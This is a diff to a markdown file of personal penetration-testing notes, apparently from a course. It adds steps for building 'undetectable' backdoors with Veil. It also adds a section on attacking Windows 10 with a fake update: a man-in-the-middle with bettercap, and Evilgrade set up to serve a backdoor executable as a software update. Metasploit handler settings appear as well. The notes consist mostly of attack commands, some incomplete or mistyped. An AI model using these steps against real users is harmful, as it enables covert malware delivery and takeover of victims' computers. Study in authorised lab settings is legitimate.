@@ -29,6 +29,7 @@ apt install -y veil
 ```
 Generating An Undetectable Backdoor  
 ```
+veil
 use
 1) Evasion =  generates undetectable backdoors for us.
 2) Ordnance = generates the payloads that's used by evasion.
@@ -83,6 +84,47 @@ set LHOST 10.10.10.10
 set LPORT 8080
 exploit
 ```
+## Hacking Windows 10 Using Fake Update
+1. We need to do MITM
+2. We need to serve fake update form evilgrade
+
+EvilGrade
+```
+cd /opt/evilgrade 
+./evilgrade
+show modules
+```
+To get a list of all the programsthat we can hijack their updates
+```
+show modules
+configure dap
+show options
+```
+he main option that we wanna change
+is the Agent.
+This is the path to the program
+that will be installed as an update.
+Replacing this with the backdoor
+```
+set agent /path/to/exe
+```
+The next thing that I wanna modify is the Endsite
+You don't have to change it with every module.
+```
+set endsite www.speedbit.com
+start
+```
+So right now, if Evil Grade gets a request for an update,
+it will say, "Yes, there is an update,"
+and it will serve the backdoor.exe as the update.
+
+Bettercap
+
+bettercap -iface eth0 -caplet /.cap
+
+
+
+
 
 ## Pentesting Resources
 https://github.com/swisskyrepo/PayloadsAllTheThings  
